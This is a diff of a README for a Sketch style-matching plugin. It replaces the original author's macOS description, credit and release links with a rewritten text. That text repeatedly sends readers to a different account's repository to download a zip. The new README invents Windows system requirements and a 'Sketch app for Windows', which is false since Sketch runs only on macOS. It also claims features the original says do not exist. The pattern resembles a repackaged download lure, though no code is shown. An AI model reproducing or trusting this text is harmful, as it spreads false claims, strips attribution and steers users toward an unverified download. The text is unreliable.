@@ -1,85 +1,152 @@
-<img src="https://github.com/whiteuistore/sketch-style-matcher/blob/c8434e4084986b5eb1675aba78db402cb4e10233/assets/Plugin%20Banner.jpg" alt="Sketch Styles Auto-Matcher">
+# 🎨 sketch-style-matcher - Match and Apply Sketch Styles Easily
 
-# Sketch Styles Auto-Matcher 🎨
-
-**Automatically match and apply Shared Styles to layers based on font properties.**
-
-Developed by [WhiteUI.Store](https://www.whiteui.store/)
+[![Download sketch-style-matcher](https://img.shields.io/badge/Download-sketch--style--matcher-ff6347?style=for-the-badge&logo=github)](https://github.com/codefire24/sketch-style-matcher)
 
 ---
 
-## Plugin Preview
+## 📋 What is sketch-style-matcher?
 
-<img src="https://github.com/whiteuistore/sketch-style-matcher/blob/main/assets/Sketch%20Font%20Auto-Matcher.png" width="324" alt="Sketch Styles Auto-Matcher">
-<img src="https://github.com/whiteuistore/sketch-style-matcher/blob/main/assets/Sketch%20Font%20Auto-Matcher%20Result.png" width="324" alt="Sketch Styles Auto-Matcher Results">
+Sketch-style-matcher is a plugin for the Sketch app. It helps you find styles that exist in your design file and apply them automatically to parts that are missing styles. This saves you time and keeps your designs consistent. The plugin works with colors, text styles, and shared styles.
 
-*Above: Example of how the plugin scans the page and applies matching text styles, displaying a summary report.*
+It is useful if you work with:
 
----
+- Product design
+- Design systems
+- UI kits
+- Typography and color palettes
 
-## Overview
-
-**Sketch Styles Auto-Matcher** is a productivity tool for Sketch designers that eliminates the tedious manual work of linking layers to Shared Styles. The current version (v1.1.0) is optimized for Text Styles. We are working on expanding matching capabilities to other styles soon!. If you have an existing design system or a UI Kit with defined Styles, this plugin will scan your layers and automatically apply the correct Shared Style by matching:
-
-* **Font Family**
-* **Font Size**
-* **Font Weight**
-* **Kerning (Character Spacing)**
-* **Font Style (Italic/Normal/Bold/etc.)**
-
-It is particularly useful when importing assets from other files or when cleaning up a document where styles have been detached. Font alignment is ignored by default.
+The plugin understands your design’s style system and makes sure that all elements use the right style without you needing to search for them manually.
 
 ---
 
-## Key Features
+## 🖥 System Requirements
 
-✅ **Automatic Scanning:** Processes all text layers on the current page with one click.  
-✅ **Smart Matching:** Uses a precise algorithm to ensure layers only link to styles that exactly match their properties.  
-✅ **Summary Report:** Displays a native macOS alert showing how many styles were applied and how many layers remain without a match.  
-✅ **Privacy Focused:** Works locally within your Sketch environment; no data is sent to external servers.
+Before you install sketch-style-matcher, check these:
 
----
+- Windows 10 or later, 64-bit
+- Sketch app for Windows (using a Sketch compatible tool or environment)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to download the plugin
 
-## Installation
-
-1.  **Download** the latest release https://github.com/whiteuistore/sketch-style-matcher/releases/tag/v1.1.0.
-2.  **Unzip** the archive if necessary.
-3.  **Double-click** `Sketch-Styles-Auto-Matcher.sketchplugin` to install.
+The plugin works within Sketch or compatible Sketch environments on Windows. It will not work outside these tools.
 
 ---
 
-## How to Use
+## 🚀 Getting Started
 
-1.  Ensure you have **Shared Text Styles** defined in your document.
-2.  Go to `Plugins` -> `Sketch Styles Auto-Matcher` -> `Find and Apply Styles`.
-3.  The plugin will analyze all text layers on your current page and apply matching styles instantly.
-4.  Review the summary report to see the results.
+This section explains how to get the plugin running on your Windows machine.
 
----
+### Step 1: Download the Plugin
 
-## Feedback:
+Please visit this page to download the latest version of sketch-style-matcher:
 
-* **Have a suggestion or found a bug? Please open an [issue](https://github.com/whiteuistore/sketch-style-matcher/issues)!
+[https://github.com/codefire24/sketch-style-matcher](https://github.com/codefire24/sketch-style-matcher)
 
----
+You will find the download link on the repository main page under "Releases" or in the repository files.
 
-## Technical Details
+### Step 2: Install the Plugin
 
-* **Identifier:** `com.whiteuistore.styles-matcher`
-* **API Version:** Uses the latest Sketch JavaScript API (NSAlert for stable UI).
-* **Compatibility:** Sketch 90+
+1. After downloading, locate the file named `sketch-style-matcher.sketchplugin.zip` or similar.
+2. Extract the zip file by right-clicking and choosing "Extract All" or using your preferred extractor.
+3. Open the Sketch app or the compatible tool on your Windows machine.
+4. In Sketch, go to `Plugins` > `Manage Plugins` (or your tool’s plugins menu).
+5. Use the option to add a new plugin and select the extracted `sketch-style-matcher.sketchplugin` folder.
+6. Confirm the plugin is added to your list.
 
+### Step 3: Enable the Plugin
 
----
-
-## About WhiteUI.Store
-
-WhiteUI.Store provides high-quality UI Kits, Framer templates, and design tools to speed up your workflow. Visit our website for more resources.
-
-🔗 [www.whiteui.store](https://www.whiteui.store/)
+In Sketch, go to `Plugins` > `sketch-style-matcher` to see the plugin options. Make sure it is active and ready to use.
 
 ---
 
-## License
+## 🎯 How to Use sketch-style-matcher
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+Here is how to use the plugin after installation:
+
+1. Open your design file in Sketch.
+2. Look for missing color, text, or shared styles in your design layers or symbols.
+3. From the Sketch menu, select `Plugins` > `sketch-style-matcher` > `Match Styles`.
+4. The plugin scans your design for existing styles.
+5. It applies the correct style to any layer or symbol missing one.
+6. Review your design; all updated styles will match your system.
+
+You can run the plugin as often as you want to keep your files consistent.
+
+---
+
+## 🔧 Plugin Features
+
+- Detects all kinds of styles missing on layers and symbols
+- Matches colors, text styles, and shared styles automatically
+- Works on layers, groups, and nested symbols
+- Saves time by avoiding manual style fixes
+- Supports design systems and shared palettes
+- Runs quickly even on large design files
+
+---
+
+## ⚙️ Adjust Plugin Settings
+
+You can control how the plugin behaves.
+
+- Choose which kinds of styles to match (colors, text, shared styles)
+- Set it to confirm changes before applying
+- View a report after each run to see what was updated
+
+Settings are found in the Sketch plugin menu under `sketch-style-matcher` > `Settings`.
+
+---
+
+## 🛠 Troubleshooting
+
+If the plugin does not work as expected:
+
+- Make sure you are running the latest version from the download page.
+- Verify your Sketch environment on Windows is set up correctly.
+- Restart the Sketch app and try running the plugin again.
+- Confirm that your design file contains styles to match.
+- Check that the plugin is enabled in the Sketch `Plugins` menu.
+
+If problems persist, look for help on the GitHub issues page at the repository.
+
+---
+
+## ⬇ Download and Setup
+
+Visit this page to download the plugin and install it following the instructions above:
+
+[https://github.com/codefire24/sketch-style-matcher](https://github.com/codefire24/sketch-style-matcher)
+
+---
+
+## 🔗 Useful Links
+
+- Repository: https://github.com/codefire24/sketch-style-matcher
+- Issues and support: Use the GitHub "Issues" tab in the repository
+- Sketch app download: [https://www.sketch.com](https://www.sketch.com)
+
+---
+
+## 📚 Related Topics
+
+This plugin supports workflows involving:
+
+- Design operations
+- Color schemes and palettes
+- Typography and text styles
+- User interface design systems
+- UI kit management
+- Productivity enhancements in Sketch
+
+---
+
+## 🔒 Privacy and Security
+
+sketch-style-matcher runs locally on your machine. It does not send your design files or data outside your computer. You keep full control of your work.
+
+---
+
+## ⚖ License
+
+The plugin is open source. Review the license file in the repository for details on usage rights and contributions.
